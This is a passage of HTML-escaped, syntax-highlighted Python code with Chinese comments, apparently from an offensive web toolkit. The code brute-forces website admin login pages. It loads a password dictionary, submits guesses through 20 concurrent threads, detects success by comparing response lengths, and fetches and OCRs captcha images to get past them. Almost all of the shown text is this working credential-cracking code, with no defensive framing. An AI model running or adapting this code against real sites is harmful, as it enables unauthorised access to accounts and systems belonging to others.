    &lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;crack_admin_login_url_inside_func&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;url&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;username&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pass_dict_file&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
        &lt;span class=&quot;c&quot;&gt;# urls和usernames是相同内容的列表&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;urls&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[]&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;usernames&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[]&lt;/span&gt;
        &lt;span class=&quot;c&quot;&gt;# passwords是pass_dict_file文件对应的所有密码的集合的列表&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;passwords&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[]&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;while&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
            &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;os&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;path&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;exists&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pass_dict_file&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;is&lt;/span&gt; &lt;span class=&quot;bp&quot;&gt;False&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
                &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;please input your password dict:&amp;gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;end&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;' '&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
                &lt;span class=&quot;n&quot;&gt;pass_dict_file&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;input&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
                &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;os&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;path&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;exists&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pass_dict_file&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;is&lt;/span&gt; &lt;span class=&quot;bp&quot;&gt;True&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
                    &lt;span class=&quot;k&quot;&gt;break&lt;/span&gt;
            &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
                &lt;span class=&quot;k&quot;&gt;break&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;f&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;open&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pass_dict_file&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;r+&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;each&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;urls&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;append&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;url&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;usernames&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;append&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;username&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;each&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;re&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sub&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;r&quot;(&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;s)$&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;each&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;passwords&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;append&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;each&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;close&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
        &lt;span class=&quot;nb&quot;&gt;sum&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;usernames_num&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;

        &lt;span class=&quot;k&quot;&gt;with&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;futures&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ThreadPoolExecutor&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;max_workers&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;20&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;as&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;executor&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;executor&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;map&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;crack_admin_login_url_thread&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;list&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;zip&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;urls&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;usernames&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;passwords&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)))&lt;/span&gt;

    &lt;span class=&quot;n&quot;&gt;get_result&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;get_user_and_pass_form_from_url&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;url&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;user_form_name&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;get_result&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'user_form_name'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;pass_form_name&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;get_result&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'pass_form_name'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
    &lt;span class=&quot;c&quot;&gt;# print(user_form_name)&lt;/span&gt;
    &lt;span class=&quot;c&quot;&gt;# print(pass_form_name)&lt;/span&gt;
    &lt;span class=&quot;c&quot;&gt;# input()&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;form_action_url&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;get_result&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'form_action_url'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;post_url&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;url&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[:&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;len&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;url&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;split&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;/&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)[&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;form_action_url&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;user_form_name&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;is&lt;/span&gt; &lt;span class=&quot;bp&quot;&gt;None&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;user_form_name is None&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pass_form_name&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;is&lt;/span&gt; &lt;span class=&quot;bp&quot;&gt;None&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;pass_form_name is None&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;unlogin_length&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;len&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;get_result&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'response_key_value'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;][&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'content'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])&lt;/span&gt;
    &lt;span class=&quot;c&quot;&gt;# 如果post数据后返回数据长度超过未登录时的0.5倍则认为是登录成功&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;logined_least_length&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;unlogin_length&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;unlogin_length&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;/&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;get_flag&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;try_time&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
    &lt;span class=&quot;nb&quot;&gt;sum&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;start&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;

    &lt;span class=&quot;c&quot;&gt;# 用来标记当前时间的&quot;相对函数全局&quot;变量&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;biaoji_time&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
    &lt;span class=&quot;c&quot;&gt;# 用来标记当前剩余完成时间的&quot;相对函数全局&quot;变量&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;tmp&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;time&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;time&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;remain_time&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;tmp&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;tmp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
    &lt;span class=&quot;c&quot;&gt;# current_username_password={}&lt;/span&gt;

    &lt;span class=&quot;n&quot;&gt;has_yanzhengma&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;bp&quot;&gt;False&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;find_yanzhengma&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;get_yanzhengma_form_and_src_from_url&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;url&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;c&quot;&gt;# print(&quot;现在打印是否找到了验证码表单&quot;)&lt;/span&gt;
    &lt;span class=&quot;c&quot;&gt;# print(find_yanzhengma)&lt;/span&gt;
    &lt;span class=&quot;c&quot;&gt;# input()&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;find_yanzhengma&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;yanzhengma_form_name&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;find_yanzhengma&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'yanzhengma_form_name'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;yanzhengma_src&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;find_yanzhengma&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'yanzhengma_src'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;has_yanzhengma&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;bp&quot;&gt;True&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;

        &lt;span class=&quot;k&quot;&gt;while&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
            &lt;span class=&quot;c&quot;&gt;# 下面获取一次验证码,只获取一次就好了&lt;/span&gt;

            &lt;span class=&quot;c&quot;&gt;# 这里不用exp10it模块中打包好的get_request和post_request来发送request请求,因为要保留session在服务器需要&lt;/span&gt;
            &lt;span class=&quot;c&quot;&gt;#yanzhengma = get_string_from_url_or_picfile(yanzhengma_src)&lt;/span&gt;
            &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;requests&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;s&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;requests&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;session&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
            &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;shutil&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;response&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;get&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;yanzhengma_src&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;stream&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;bp&quot;&gt;True&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
            &lt;span class=&quot;k&quot;&gt;with&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;open&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'img.png'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'wb'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;as&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;out_file&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
                &lt;span class=&quot;n&quot;&gt;shutil&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;copyfileobj&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;response&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;raw&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;out_file&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
            &lt;span class=&quot;k&quot;&gt;del&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;response&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;yanzhengma&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;get_string_from_url_or_picfile&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;img.png&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;os&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;system&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;rm img.png&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

            &lt;span class=&quot;n&quot;&gt;time&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sleep&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
            &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;re&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;search&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;r&quot;[^a-zA-Z0-9]+&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;yanzhengma&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
                &lt;span class=&quot;c&quot;&gt;# time.sleep(3)&lt;/span&gt;
                &lt;span class=&quot;k&quot;&gt;continue&lt;/span&gt;
            &lt;span class=&quot;k&quot;&gt;elif&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;re&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;search&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;r&quot;&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;s&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;yanzhengma&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
                &lt;span class=&quot;k&quot;&gt;continue&lt;/span&gt;
            &lt;span class=&quot;k&quot;&gt;elif&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;yanzhengma&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
                &lt;span class=&quot;k&quot;&gt;continue&lt;/span&gt;
            &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
                &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;yanzhengma_len&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
                    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;len&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;yanzhengma&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;yanzhengma_len&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
                        &lt;span class=&quot;k&quot;&gt;continue&lt;/span&gt;
                &lt;span class=&quot;c&quot;&gt;# print(yanzhengma)&lt;/span&gt;
                &lt;span class=&quot;c&quot;&gt;# print(len(yanzhengma))&lt;/span&gt;
                &lt;span class=&quot;k&quot;&gt;break&lt;/span&gt;

    &lt;span class=&quot;k&quot;&gt;with&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;open&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;r&quot;&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;s&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;%&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;user_dict_file&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;r+&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;as&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;user_file&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
